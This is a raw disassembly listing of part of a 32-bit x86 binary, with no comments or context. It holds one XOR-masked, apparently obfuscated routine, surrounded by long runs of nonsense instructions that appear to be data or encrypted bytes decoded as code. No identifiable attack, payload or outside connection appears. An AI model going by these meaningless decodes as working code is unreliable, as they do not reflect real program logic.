  42086f:	enter  0xda7d,0xda
  420873:	pop    ebx
  420874:	call   0x7b89:0x75447709
  42087b:	aaa    
  42087c:	shl    BYTE PTR [edi-0xb36da1e],1
  420882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420883:	mov    ah,0x11
  420885:	stc    
  420886:	adc    BYTE PTR [ebx],ah
  420888:	arpl   WORD PTR [esi+0x6e],bp
  42088b:	lahf   
  42088c:	out    0xb7,al
  42088e:	push   ecx
  42088f:	fxch   st(2)
  420891:	outs   dx,BYTE PTR ds:[esi]
  420892:	sub    dh,BYTE PTR [ebp+0x28ab28bb]
  420898:	fiadd  DWORD PTR [edx]
  42089a:	and    edx,DWORD PTR ds:[esi-0x35225d20]
  4208a1:	add    eax,0xc43c4038
  4208a6:	xor    DWORD PTR [edi],esp
  4208a8:	mov    dl,0x4b
  4208aa:	mov    ds:0xaaba7128,al
  4208af:	jne    0x4208bc
  4208b1:	ins    BYTE PTR es:[edi],dx
  4208b2:	adc    eax,0x79aa5425
  4208b7:	inc    edi
  4208b8:	mov    bh,0x6
  4208ba:	pop    edx
  4208bb:	test   eax,0x4dd3d329
  4208c0:	xor    DWORD PTR [eax+0x7c],0xffffff95
  4208c4:	jp     0x420865
  4208c6:	pop    esi
  4208c7:	mov    bh,0x8c
  4208c9:	mov    bl,0xd3
  4208cb:	inc    edi
  4208cc:	jne    0x42086a
  4208ce:	rol    BYTE PTR [edi],1
  4208d0:	imul   ecx,DWORD PTR [ecx+0x4b],0x7646df62
  4208d7:	lods   al,BYTE PTR ds:[esi]
  4208d8:	add    DWORD PTR [edx-0x75],eax
  4208db:	jns    0x42089f
  4208dd:	fcmovnbe st,st(4)
  4208df:	dec    eax
  4208e0:	arpl   bp,cx
  4208e2:	inc    esi
  4208e3:	cmp    BYTE PTR [ebx-0x40],bh
  4208e6:	mov    ds:0xda8c49c8,al
  4208eb:	push   cs
  4208ec:	or     ebx,DWORD PTR [ebx+0x297ab902]
  4208f2:	out    0x2,al
  4208f4:	add    al,0xa2
  4208f6:	jmp    0x9aef9823
  4208fb:	mov    ecx,0x318fde92
  420900:	and    al,0xc1
  420902:	xchg   DWORD PTR [esi-0x9],ecx
  420905:	loope  0x4208d9
  420907:	nop
  420908:	mov    ds:0xd230a776,eax
  42090e:	je     0x4208f6
  420910:	pop    es
  420911:	jmp    0x6f91a5d4
  420916:	push   ds
  420917:	or     al,0x9d
  420919:	jle    0x420904
  42091b:	or     BYTE PTR [edx+ebx*2-0x61],bh
  42091f:	daa    
  420920:	mov    esp,esi
  420922:	in     eax,dx
  420923:	dec    ecx
  420924:	(bad)  
  420925:	sub    DWORD PTR [ebp-0x5],edi
  420928:	pop    ebx
  420929:	xchg   ebx,eax
  42092a:	push   esp
  42092b:	mov    fs,WORD PTR [edi]
  42092d:	(bad)  
  42092e:	fsub   DWORD PTR [eax+0x44]
  420931:	or     ebx,0xffffff84
  420934:	xor    BYTE PTR [edx-0x77],dl
  420937:	jae    0x420920
  420939:	push   esp
  42093a:	int3   
  42093b:	mov    al,ds:0x2af0768
  420940:	call   DWORD PTR [ecx]
  420942:	push   ebx
  420943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420944:	imul   edi,DWORD PTR [edx],0xe067453a
  42094a:	sub    eax,0xdd60d269
  42094f:	cli    
  420950:	cmp    bl,BYTE PTR ds:0xbc877860
  420956:	retf   0x2e19
  420959:	pop    ecx
  42095a:	pop    eax
  42095b:	mov    edi,0xf47a4aaa
  420960:	or     al,0x6b
  420962:	or     al,0xd5
  420964:	aaa    
  420965:	mov    al,0xe0
  420967:	ins    DWORD PTR es:[edi],dx
  420968:	mov    ds:0x2399ce9a,al
  42096d:	sbb    eax,0x7e9a4e0d
  420972:	cli    
  420973:	add    esi,esi
  420975:	inc    ebp
  420976:	mov    eax,ds:0xf4aa4025
  42097b:	add    BYTE PTR [ecx],dl
  42097d:	push   ebp
  42097e:	iret   
  42097f:	mov    dl,0x4d
  420981:	bound  ebx,QWORD PTR [eax-0x39]
  420984:	xchg   DWORD PTR [ebp+0x8c2d0c0],edx
  42098a:	push   ebp
  42098b:	dec    eax
  42098c:	sbb    al,0xdc
  42098e:	fistp  WORD PTR [eax+0x27]
  420991:	aad    0x95
  420993:	push   esi
  420994:	mov    dh,0xa7
  420996:	mov    dh,0xc2
  420998:	mov    ah,0x8
  42099a:	retf   0x3490
  42099d:	mov    ecx,0x4c995ce2
  4209a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209a3:	lahf   
  4209a4:	add    dh,al
  4209a6:	iret   
  4209a7:	jnp    0x420977
  4209a9:	sti    
  4209aa:	lods   al,BYTE PTR ds:[esi]
  4209ab:	cmp    DWORD PTR [eax-0x31e9e888],ebp
  4209b1:	pushf  
  4209b2:	mov    ah,0xfe
  4209b4:	xor    al,0x78
  4209b6:	push   0x59
  4209b8:	icebp  
  4209b9:	fisttp QWORD PTR [esi+0x49]
  4209bc:	add    ecx,ebx
  4209be:	(bad)  
  4209bf:	cmp    al,0x9b
  4209c1:	jbe    0x420985
  4209c3:	push   0x17
  4209c5:	ins    DWORD PTR es:[edi],dx
  4209c6:	cmp    eax,0x5cfd7f1f
  4209cb:	pop    edi
  4209cc:	jl     0x420a15
  4209ce:	sbb    al,0x4c
  4209d0:	mov    dl,0x61
  4209d2:	mov    WORD PTR [edx-0x22c2beee],cs
  4209d8:	ficom  WORD PTR [ebp+0x4b942ec3]
  4209de:	imul   ebp,DWORD PTR [ebx+ecx*4+0x58feef6f],0xc3ead0d1
  4209e9:	cld    
  4209ea:	jbe    0x420a57
  4209ec:	xchg   esp,eax
  4209ed:	pop    ecx
  4209ee:	out    0xc1,eax
  4209f0:	aas    
  4209f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209f2:	popf   
  4209f3:	or     BYTE PTR [edx],cl
  4209f5:	pop    eax
  4209f6:	cwde   
  4209f7:	into   
  4209f8:	push   esi
  4209f9:	fdivp  st(0),st
  4209fb:	bnd jo 0x4209ec
  4209fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209ff:	push   eax
  420a00:	stos   BYTE PTR es:[edi],al
  420a01:	fidiv  WORD PTR [ebx-0x6b]
  420a04:	ret    0x8922
  420a07:	dec    eax
  420a08:	aaa    
  420a09:	dec    esi
  420a0a:	cmp    bh,BYTE PTR [eax-0x2a]
  420a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a0e:	pop    ebx
  420a0f:	xchg   edx,eax
  420a10:	jle    0x420a75
  420a12:	xchg   ecx,eax
  420a13:	lahf   
  420a14:	not    DWORD PTR [edi+ecx*2+0x64]
  420a18:	fdivr  QWORD PTR [ecx-0x64e01478]
  420a1e:	jg     0x420a7d
  420a20:	pusha  
  420a21:	mov    ?,WORD PTR [ecx+0x39762]
  420a27:	push   es
  420a28:	(bad)  
  420a29:	out    dx,eax
  420a2a:	rcr    ch,1
  420a2c:	inc    ebx
  420a2d:	hlt    
  420a2e:	mov    eax,ds:0x8efcaa7
  420a33:	nop
  420a34:	out    dx,al
  420a35:	mov    ah,0x2a
  420a37:	(bad)  
  420a38:	rol    DWORD PTR [ebx+eax*4-0x2f],1
  420a3c:	pop    esp
  420a3d:	js     0x4209f1
  420a3f:	mov    ebx,0x10b3af11
  420a44:	sbb    edi,DWORD PTR [edx]
  420a46:	cwde   
  420a47:	mov    edx,0x84c4bd03
  420a4c:	fidivr WORD PTR [edx]
  420a4e:	or     BYTE PTR [ebp-0x7d8bb88f],ch
  420a54:	mov    ebp,0xbafda8b
  420a59:	inc    esp
  420a5a:	test   BYTE PTR [edx],0xef
  420a5d:	daa    
  420a5e:	inc    ebp
  420a5f:	scas   eax,DWORD PTR es:[edi]
  420a60:	cmp    eax,0x12f33e04
  420a65:	aam    0x93
  420a67:	out    0xa5,al
  420a69:	jmp    0x7a1762df
  420a6e:	pop    ebp
  420a6f:	mov    esp,0x2f8e5c77
  420a74:	mov    bh,0xbf
  420a76:	sti    
  420a77:	inc    ebx
  420a78:	cdq    
  420a79:	outs   dx,DWORD PTR ds:[esi]
  420a7b:	push   DWORD PTR ds:0x1abf0d0c
  420a81:	or     DWORD PTR [edx+0x7a],edx
  420a84:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a86:	daa    
  420a87:	mov    bh,0xcd
  420a89:	ret    
  420a8a:	loop   0x420a67
  420a8c:	xchg   edi,ebp
  420a8e:	or     al,0x54
  420a90:	fld    TBYTE PTR [ebx-0x4a15139]
  420a96:	push   ecx
  420a97:	adc    cl,ch
  420a99:	mov    esp,0xa9eabaf2
  420a9e:	ss sub ebx,ebp
  420aa1:	adc    edi,ebp
  420aa3:	jo     0x420a6c
  420aa5:	test   eax,0xdc2fde6c
  420aaa:	mov    dh,0xb8
  420aac:	inc    ebp
  420aad:	addr16 pop esp
  420aaf:	sub    BYTE PTR [ebx-0xd],0x39
  420ab3:	mov    ah,0x42
  420ab5:	sbb    cl,dh
  420ab7:	pop    ebp
  420ab8:	mov    ebx,DWORD PTR [ebx-0x42]
  420abb:	jns    0x420a79
  420abd:	loopne 0x420ad5
  420abf:	dec    ebp
  420ac0:	repz and al,0xef
  420ac3:	cdq    
  420ac4:	xor    dh,BYTE PTR [edi+esi*4-0x48]
  420ac8:	xchg   esi,eax
  420ac9:	loope  0x420aea
  420acb:	push   esi
  420acc:	scas   al,BYTE PTR es:[edi]
  420acd:	dec    esi
  420ace:	sub    al,0x3f
  420ad0:	mov    esi,DWORD PTR [ebx-0x4f]
  420ad3:	mov    al,ds:0xb2d85c87
  420ad8:	adc    ebp,DWORD PTR [esi+0x53cffbd3]
  420ade:	or     bl,BYTE PTR [eax]
  420ae0:	scas   al,BYTE PTR es:[edi]
  420ae1:	pop    ss
  420ae2:	lahf   
  420ae3:	scas   al,BYTE PTR es:[edi]
  420ae4:	xchg   ecx,eax
  420ae5:	test   dh,al
  420ae7:	ins    BYTE PTR es:[edi],dx
  420ae8:	aam    0xbb
  420aea:	das    
  420aeb:	xchg   ebp,eax
  420aec:	fs lahf 
  420aee:	out    dx,al
  420aef:	shufps xmm4,XMMWORD PTR ds:0x535afe8e,0xce
  420af7:	push   es
  420af8:	sub    eax,0xf58aea71
  420afd:	adc    al,0x2e
  420aff:	dec    esi
  420b01:	mov    dh,0x13
  420b03:	rcl    BYTE PTR [edx],cl
  420b05:	js     0x420aac
  420b07:	or     DWORD PTR ds:0x997a1bca,0xffffffef
  420b0e:	sub    esi,DWORD PTR ds:0xf0049f0c
  420b14:	or     BYTE PTR [esi],bl
  420b16:	pop    ss
  420b17:	rcr    DWORD PTR [eax],1
  420b19:	shl    DWORD PTR [esi+0x76],1
  420b1c:	loope  0x420b39
  420b1e:	inc    edx
  420b1f:	jne    0x420b52
  420b21:	jae    0x420b9e
  420b23:	push   eax
  420b24:	pop    ebx
  420b25:	xlat   BYTE PTR ds:[ebx]
  420b26:	outs   dx,BYTE PTR ds:[esi]
  420b27:	mov    WORD PTR [edi],cs
  420b29:	loopne 0x420b8b
  420b2b:	outs   dx,DWORD PTR ds:[esi]
  420b2c:	ret    
  420b2d:	repnz or eax,0xc933403c
  420b33:	call   0xa4e74a52
  420b38:	cdq    
  420b39:	scas   eax,DWORD PTR es:[edi]
  420b3a:	cdq    
  420b3b:	stc    
  420b3c:	mov    cs,esp
  420b3e:	adc    DWORD PTR [esi],ebx
  420b40:	mov    ebx,0x46f8204
  420b45:	ja     0x420b55
  420b47:	(bad)  
  420b48:	and    al,0xca
  420b4a:	cwde   
  420b4b:	lock xchg edi,eax
  420b4d:	cmp    dl,BYTE PTR [esi+0x27]
  420b50:	push   cs
  420b51:	or     eax,edi
  420b53:	les    esp,FWORD PTR [esi+0x5c]
  420b56:	sti    
  420b57:	imul   ebx,DWORD PTR [ebx],0x33
  420b5a:	inc    ebx
  420b5b:	mov    WORD PTR [esi+0x6f],ss
  420b5e:	inc    edx
  420b5f:	dec    cl
  420b61:	sub    al,BYTE PTR [ecx+0x3769b07d]
  420b67:	mov    ds:0x5a3b3fe6,al
  420b6c:	dec    edi
  420b6d:	fidiv  WORD PTR ds:0xf634779c
  420b73:	xchg   edi,eax
  420b74:	inc    edi
  420b75:	mov    ch,0x12
  420b77:	lods   eax,DWORD PTR ds:[esi]
  420b78:	es pop edi
  420b7a:	bnd jo 0x420b2f
  420b7d:	lods   al,BYTE PTR ds:[esi]
  420b7e:	add    eax,0xdd3e19a0
  420b83:	ret    0xc412
  420b86:	xchg   esp,eax
  420b87:	repz lahf 
  420b89:	dec    esi
  420b8a:	jb     0x420b56
  420b8c:	jns    0x420b7d
  420b8e:	add    ecx,DWORD PTR [ecx+esi*2+0x1d]
  420b92:	imul   ebx,DWORD PTR [ebp-0x3a],0x18
  420b96:	in     al,0xd2
  420b98:	mov    bl,0x1
  420b9a:	dec    ebp
  420b9b:	and    al,0x8
  420b9d:	sub    ecx,ecx
  420b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ba0:	cmp    esp,DWORD PTR [edx+0x77]
  420ba3:	iret   
  420ba4:	pop    ecx
  420ba5:	fwait
  420ba6:	aad    0x79
  420ba8:	popa   
  420ba9:	and    ebx,edx
  420bab:	mov    ebx,0x3876c1b8
  420bb0:	mov    ss,WORD PTR [ecx]
  420bb2:	pushf  
  420bb3:	into   
  420bb4:	mov    esi,0x56c7a24e
  420bb9:	xchg   edi,eax
  420bba:	gs push cs
  420bbc:	daa    
  420bbd:	stos   DWORD PTR es:[edi],eax
  420bbe:	lods   eax,DWORD PTR ds:[esi]
  420bbf:	or     bl,BYTE PTR [edi+0x60330d1f]
  420bc5:	xor    DWORD PTR [esi+0x109a0038],ecx
  420bcb:	mov    dl,0xdd
  420bcd:	or     ah,BYTE PTR [esp+eiz*2-0x1d]
  420bd1:	mov    dl,0x18
  420bd3:	mov    BYTE PTR [edx-0x34],0xd9
  420bd7:	fcomp  DWORD PTR [ebx*1-0x7e71d3b2]
  420bde:	je     0x420c08
  420be0:	mov    esi,0xdb7350af
  420be5:	rcl    DWORD PTR [edx],cl
  420be7:	mov    BYTE PTR [esp+esi*1],bh
  420bea:	or     DWORD PTR [ebx+0x77],eax
  420bed:	jo     0x420bb9
  420bef:	xor    DWORD PTR [ebp+0x6b6e9a8f],eax
  420bf5:	lahf   
  420bf6:	leave  
  420bf7:	add    DWORD PTR [edi+0x1e],eax
  420bfa:	dec    eax
  420bfb:	mov    esp,0x26c4b97a
  420c00:	out    0xd9,al
  420c02:	push   0xffffffd1
  420c04:	out    dx,al
  420c05:	pushf  
  420c06:	fld    TBYTE PTR [ebx+edx*1-0x6f]
  420c0a:	clc    
  420c0b:	idiv   DWORD PTR [eax-0x149ebed1]
  420c11:	in     al,0xe9
  420c13:	popa   
  420c14:	cmp    bh,BYTE PTR [ecx]
  420c16:	pop    esp
  420c17:	shr    DWORD PTR [ebx+0x54],0x8c
  420c1b:	mov    al,ds:0x467b584
  420c20:	mov    ebp,0x9502dbe7
  420c25:	or     BYTE PTR ds:0xd5556fd3,0x5a
  420c2c:	test   al,0x89
  420c2e:	ror    DWORD PTR ds:0xa22de1ae,1
  420c34:	push   eax
  420c35:	sti    
  420c36:	inc    esp
  420c37:	in     eax,dx
  420c38:	retf   
  420c39:	or     esp,ebp
  420c3b:	lahf   
  420c3c:	shl    eax,0x86
  420c3f:	mov    eax,ds:0xa25b69fb
  420c44:	test   ebp,esi
  420c46:	popf   
  420c47:	sub    DWORD PTR [esi+0x7cfb6c51],ebx
  420c4d:	(bad)  
  420c4e:	mul    DWORD PTR [eax+esi*4-0x43]
  420c52:	cmp    eax,0x8f59d98a
  420c57:	out    0xef,al
  420c59:	data16 rcl BYTE PTR [eax],0x2
  420c5d:	fwait
  420c5e:	push   esp
  420c5f:	push   ebp
  420c60:	lahf   
  420c61:	push   DWORD PTR [edx+0x8]
  420c64:	sub    dl,BYTE PTR [ecx]
  420c66:	fs mov ebp,0x7765b485
  420c6c:	test   eax,0xdec2f6ed
  420c71:	repnz cmp eax,edi
  420c74:	ror    esp,0x32
  420c77:	jns    0x420c48
  420c79:	or     dh,BYTE PTR [ecx+0x4e]
  420c7c:	jnp    0x420c32
  420c7e:	adc    bl,BYTE PTR [esi-0x51]
  420c81:	adc    ch,BYTE PTR [ecx-0x6d009341]
  420c87:	div    BYTE PTR [eax+0x50]
  420c8a:	mov    edx,esi
  420c8c:	inc    esp
  420c8d:	push   es
  420c8e:	push   ds
  420c8f:	pop    ebx
  420c90:	or     ch,BYTE PTR [ebx+0x3f]
  420c93:	jno    0x420c70
  420c95:	sti    
  420c96:	or     al,0xb7
  420c98:	sub    BYTE PTR [ecx+0x33],ch
  420c9b:	add    al,0xc0
  420c9d:	lock scas al,BYTE PTR es:[edi]
  420c9f:	cs push ebp
  420ca1:	imul   ebx,DWORD PTR [edi-0x26ff659c],0x38fde5e8
  420cab:	aaa    
  420cac:	scas   eax,DWORD PTR es:[edi]
  420cad:	(bad)  
  420cae:	fst    DWORD PTR [ecx+0x19ae07c2]
  420cb4:	stos   BYTE PTR es:[edi],al
  420cb5:	push   0x29
  420cb7:	arpl   WORD PTR [ebx+0x73],sp
  420cba:	inc    esp
  420cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cbc:	jp     0x420ce3
  420cbe:	mov    eax,0x805066ca
  420cc3:	out    dx,eax
  420cc4:	xchg   edi,eax
  420cc5:	pop    ebp
  420cc6:	adc    al,0x8a
  420cc8:	pushf  
  420cc9:	(bad)  
  420cca:	fld    TBYTE PTR [ebx]
  420ccc:	ss pusha 
  420cce:	mov    eax,ds:0x36a99819
  420cd3:	mov    ebp,0x41ff2b76
  420cd8:	xchg   DWORD PTR [ebx+0x8],edx
  420cdb:	mov    ebp,0x19aee8a2
  420ce0:	test   eax,0x2acf22e9
  420ce5:	imul   ebp,DWORD PTR [ecx],0xffffff86
  420ce8:	inc    esp
  420ce9:	inc    eax
  420cea:	mov    cl,BYTE PTR [eax]
  420cec:	inc    esi
  420ced:	and    DWORD PTR [edx],edi
  420cef:	sti    
  420cf0:	dec    ebp
  420cf1:	imul   ecx,DWORD PTR [esi-0x29523653],0xffffffc4
  420cf8:	jmp    0x420d21
  420cfa:	imul   edi,DWORD PTR [ecx+0xd2ea8f9],0xffffff8c
  420d01:	jle    0x3fee06c3
  420d07:	push   es
  420d08:	push   ds
  420d09:	push   esi
  420d0a:	aad    0xe5
  420d0c:	fisubr DWORD PTR [edi+edx*2+0x12b83272]
  420d13:	xchg   dl,bl
  420d15:	ins    DWORD PTR es:[edi],dx
  420d16:	xor    edi,ebx
  420d18:	mov    DWORD PTR [edx],edi
  420d1a:	mov    edx,DWORD PTR [ebp+0x8]
  420d1d:	xor    edx,eax
  420d1f:	inc    ecx
  420d20:	inc    DWORD PTR [ebp-0x18]
  420d23:	add    edx,esi
  420d25:	cmp    ecx,edx
  420d27:	jb     0x41e963
  420d2d:	jmp    0x420d77
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	mov    DWORD PTR [ebp+0x8],ecx
  420d38:	jmp    0x420d6a
  420d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  420d40:	mov    edx,DWORD PTR [ebp-0x8]
  420d43:	xor    ecx,eax
  420d45:	xor    edx,eax
  420d47:	sub    ecx,edx
  420d49:	sub    ecx,esi
  420d4b:	xor    ecx,eax
  420d4d:	mov    DWORD PTR [ebp+0x8],ecx
  420d50:	mov    ecx,DWORD PTR [ebp+0x8]
  420d53:	mov    edx,DWORD PTR [ebp+0x8]
  420d56:	imul   edx,edx,0x5708f2
  420d5c:	xor    ecx,eax
  420d5e:	add    ecx,esi
  420d60:	lea    ecx,[ebp+ecx*4-0x64]
  420d64:	mov    edi,DWORD PTR [ecx]
  420d66:	add    edx,edi
  420d68:	mov    DWORD PTR [ecx],edx
  420d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  420d6d:	xor    ecx,eax
  420d6f:	add    ecx,esi
  420d71:	jne    0x420d3d
  420d77:	mov    ecx,DWORD PTR [ebp-0xc]
  420d7a:	mov    DWORD PTR [ebp+0x8],ecx
  420d7d:	jmp    0x420daf
  420d82:	mov    ecx,DWORD PTR [ebp+0x8]
  420d85:	mov    edx,DWORD PTR [ebp-0x8]
  420d88:	xor    ecx,eax
  420d8a:	xor    edx,eax
  420d8c:	sub    ecx,edx
  420d8e:	sub    ecx,esi
  420d90:	xor    ecx,eax
  420d92:	mov    DWORD PTR [ebp+0x8],ecx
  420d95:	mov    ecx,DWORD PTR [ebp+0x8]
  420d98:	mov    edx,DWORD PTR [ebp+0x8]
  420d9b:	imul   edx,edx,0x5708f2
  420da1:	xor    ecx,eax
  420da3:	add    ecx,esi
  420da5:	lea    ecx,[ebp+ecx*4-0x64]
  420da9:	mov    edi,DWORD PTR [ecx]
  420dab:	add    edx,edi
  420dad:	mov    DWORD PTR [ecx],edx
  420daf:	mov    ecx,DWORD PTR [ebp+0x8]
  420db2:	xor    ecx,eax
  420db4:	add    ecx,esi
  420db6:	jne    0x420d82
  420dbc:	mov    ecx,DWORD PTR [ebp-0x8]
  420dbf:	mov    edx,DWORD PTR [ebp-0x20]
  420dc2:	xor    ecx,eax
  420dc4:	lea    ecx,[ecx+edx*1+0x3272dd]
  420dcb:	mov    DWORD PTR [ebp-0x20],ecx
  420dce:	inc    DWORD PTR [ebp+0xc]
  420dd1:	mov    ecx,DWORD PTR [ebp-0x1c]
  420dd4:	xor    ecx,eax
  420dd6:	add    ecx,esi
  420dd8:	jne    0x413678
  420dde:	jmp    0x420e67
  420de3:	mov    ecx,DWORD PTR [ebp-0xc]
  420de6:	mov    DWORD PTR [ebp+0x8],ecx
  420de9:	jmp    0x420e1b
  420dee:	mov    ecx,DWORD PTR [ebp+0x8]
  420df1:	mov    edx,DWORD PTR [ebp-0x8]
  420df4:	xor    ecx,eax
  420df6:	xor    edx,eax
  420df8:	sub    ecx,edx
  420dfa:	sub    ecx,esi
  420dfc:	xor    ecx,eax
  420dfe:	mov    DWORD PTR [ebp+0x8],ecx
  420e01:	mov    ecx,DWORD PTR [ebp+0x8]
  420e04:	mov    edx,DWORD PTR [ebp+0x8]
  420e07:	imul   edx,edx,0x5708f2
  420e0d:	xor    ecx,eax
  420e0f:	add    ecx,esi
  420e11:	lea    ecx,[ebp+ecx*4-0x64]
  420e15:	mov    edi,DWORD PTR [ecx]
  420e17:	add    edx,edi
  420e19:	mov    DWORD PTR [ecx],edx
  420e1b:	mov    ecx,DWORD PTR [ebp+0x8]
  420e1e:	xor    ecx,eax
  420e20:	add    ecx,esi
  420e22:	jne    0x420dee
  420e28:	jmp    0x420e73
  420e2d:	mov    ecx,DWORD PTR [ebp+0x8]
  420e30:	mov    edx,DWORD PTR [ebp-0x8]
  420e33:	xor    ecx,eax
  420e35:	xor    edx,eax
  420e37:	sub    ecx,edx
  420e39:	sub    ecx,esi
  420e3b:	xor    ecx,eax
  420e3d:	mov    DWORD PTR [ebp+0x8],ecx
  420e40:	mov    ecx,DWORD PTR [ebp+0x8]
  420e43:	mov    edx,DWORD PTR [ebp+0x8]
  420e46:	xor    ecx,eax
  420e48:	imul   edx,edx,0x5708f2
  420e4e:	add    ecx,esi
  420e50:	lea    ecx,[ebp+ecx*4-0x64]
  420e54:	mov    edi,DWORD PTR [ecx]
  420e56:	add    edx,edi
  420e58:	mov    DWORD PTR [ecx],edx
  420e5a:	mov    ecx,DWORD PTR [ebp+0x8]
  420e5d:	xor    ecx,eax
  420e5f:	add    ecx,esi
  420e61:	jne    0x420e2d
  420e67:	mov    ecx,DWORD PTR [ebp-0x8]
  420e6a:	xor    ecx,eax
  420e6c:	mov    eax,DWORD PTR [ebp+0x10]
  420e6f:	add    ecx,esi
  420e71:	mov    DWORD PTR [eax],ecx
  420e73:	pop    edi
  420e74:	pop    esi
  420e75:	pop    ebx
  420e76:	leave  
  420e77:	ret    0xc
  420e7a:	dec    ebp
  420e7b:	and    eax,0x55210010
  420e80:	adc    BYTE PTR [eax],al
  420e82:	call   DWORD PTR [ebp+0x10]
  420e85:	add    bh,al
  420e87:	adc    BYTE PTR ss:[eax],al
  420e8a:	cld    
  420e8b:	ins    BYTE PTR es:[edi],dx
  420e8c:	adc    BYTE PTR [eax],al
  420e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e8f:	js     0x420ea1
  420e91:	add    BYTE PTR [ebx+eiz*2],al
  420e94:	adc    BYTE PTR [eax],al
  420e96:	dec    edi
  420e97:	jae    0x420ea9
  420e99:	add    ah,bl
  420e9b:	sub    eax,0x6ed60010
  420ea0:	adc    BYTE PTR [eax],al
  420ea2:	cmp    BYTE PTR [ecx],al
  420ea4:	adc    BYTE PTR [eax],al
  420ea6:	cwde   
  420ea7:	cmovb  eax,DWORD PTR [eax]
  420eaa:	pushf  
  420eab:	cmovb  eax,DWORD PTR [eax]
  420eae:	mov    al,ds:0xa400420f
  420eb3:	cmovb  eax,DWORD PTR [eax]
  420eb6:	test   al,0xf
  420eb8:	inc    edx
  420eb9:	add    BYTE PTR [edi+ecx*1+0xfb00042],ch
  420ec0:	inc    edx
  420ec1:	add    BYTE PTR [edi+ecx*1+0x42],dh
	...
  420ed4:	dec    edx
  420ed5:	aam    0xb3
  420ed7:	dec    ebp
  420ed8:	add    BYTE PTR [eax],al
  420eda:	add    BYTE PTR [eax],al
  420edc:	add    al,BYTE PTR [eax]
  420ede:	add    BYTE PTR [eax],al
  420ee0:	cmp    eax,0xc0000000
  420ee5:	lar    eax,WORD PTR [eax]
  420ee8:	rol    BYTE PTR [ebx],0x2
  420eeb:	add    BYTE PTR [edx+0xe],al
  420eee:	adc    BYTE PTR [eax],al
  420ef0:	pop    esp
  420ef1:	sbb    edx,DWORD PTR [eax]
  420ef3:	add    BYTE PTR [ebx-0x4dffefb0],cl
  420ef9:	sub    eax,0x29930010
  420efe:	adc    BYTE PTR [eax],al
  420f00:	mov    al,ds:0x5900101f
  420f05:	push   ebp
  420f06:	adc    BYTE PTR [eax],al
  420f08:	ret    0x102d
  420f0b:	add    BYTE PTR [edx+0xe],bh
  420f0e:	inc    edx
  420f0f:	add    BYTE PTR [esi+0xe],bh
  420f12:	inc    edx
  420f13:	add    BYTE PTR [edx-0x79ffbdf2],al
  420f19:	push   cs
  420f1a:	inc    edx
  420f1b:	add    BYTE PTR [edx-0x71ffbdf2],cl
  420f21:	push   cs
  420f22:	inc    edx
  420f23:	add    BYTE PTR [edx-0x69ffbdf2],dl
  420f29:	push   cs
  420f2a:	inc    edx
  420f2b:	add    BYTE PTR [edx-0x61ffbdf2],bl
  420f31:	push   cs
  420f32:	inc    edx
  420f33:	add    BYTE PTR [edx+0x5800420e],ah
  420f39:	cmovb  eax,DWORD PTR [eax]
  420f3c:	pop    esp
  420f3d:	cmovb  eax,DWORD PTR [eax]
  420f40:	pusha  
  420f41:	cmovb  eax,DWORD PTR [eax]
  420f44:	cmovb  eax,DWORD PTR fs:[eax]
  420f48:	push   0x6c00420f
  420f4d:	cmovb  eax,DWORD PTR [eax]
  420f50:	jo     0x420f61
  420f52:	inc    edx
  420f53:	add    BYTE PTR [edi+ecx*1+0x42],dh
  420f57:	add    al,cl
  420f59:	cmp    edx,DWORD PTR [eax]
  420f5b:	add    BYTE PTR [ecx+0x25],dh
  420f5e:	adc    BYTE PTR [eax],al
  420f60:	fld    TBYTE PTR [ecx]
  420f62:	adc    BYTE PTR [eax],al
  420f64:	xchg   edi,eax
  420f65:	sub    al,0x10
  420f67:	add    dh,ah
  420f69:	aaa    
  420f6a:	adc    BYTE PTR [eax],al
  420f6c:	and    eax,0xd5001051
  420f71:	xor    dl,BYTE PTR [eax]
  420f73:	add    BYTE PTR [eax-0x13ffefd8],ch
  420f79:	push   cs
  420f7a:	inc    edx
  420f7b:	add    al,dh
  420f7d:	push   cs
  420f7e:	inc    edx
  420f7f:	add    ah,dh
  420f81:	push   cs
  420f82:	inc    edx
  420f83:	add    al,bh
  420f85:	push   cs
  420f86:	inc    edx
  420f87:	add    ah,bh
  420f89:	push   cs
  420f8a:	inc    edx
  420f8b:	add    BYTE PTR [eax],al
  420f8d:	cmovb  eax,DWORD PTR [eax]
  420f90:	add    al,0xf
  420f92:	inc    edx
  420f93:	add    BYTE PTR [eax],cl
  420f95:	cmovb  eax,DWORD PTR [eax]
  420f98:	adc    DWORD PTR [ebp+0x10],ebx
  420f9b:	add    bh,cl
  420f9d:	push   es
  420f9e:	adc    BYTE PTR [eax],al
  420fa0:	xchg   esp,eax
  420fa1:	xor    eax,0x7b780010
  420fa6:	adc    BYTE PTR [eax],al
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	jo     0x420fbb
  420fab:	add    BYTE PTR [eax],ch
  420fad:	inc    esp
  420fae:	adc    BYTE PTR [eax],al
  420fb0:	pop    ebp
  420fb1:	pop    ecx
  420fb2:	adc    BYTE PTR [eax],al
  420fb4:	fild   QWORD PTR [edi]
  420fb6:	adc    BYTE PTR [eax],al
	...
  420fc0:	push   edx
  420fc1:	push   ebx
  420fc2:	inc    esp
  420fc3:	push   ebx
  420fc4:	icebp  
  420fc5:	lds    ebx,FWORD PTR [esi]
  420fc7:	sbb    edx,ebp
  420fc9:	mov    eax,ds:0x75b243ac
  420fce:	repz mov eax,0xb1fbd448
  420fd4:	add    DWORD PTR [eax],eax
  420fd6:	add    BYTE PTR [eax],al
  420fd8:	inc    ebx
  420fd9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  420fdd:	jb     0x421051
  420fdf:	outs   dx,BYTE PTR gs:[esi]
  420fe1:	je     0x421027
  420fe3:	popa   
  420fe4:	je     0x421047
  420fe6:	pop    esp
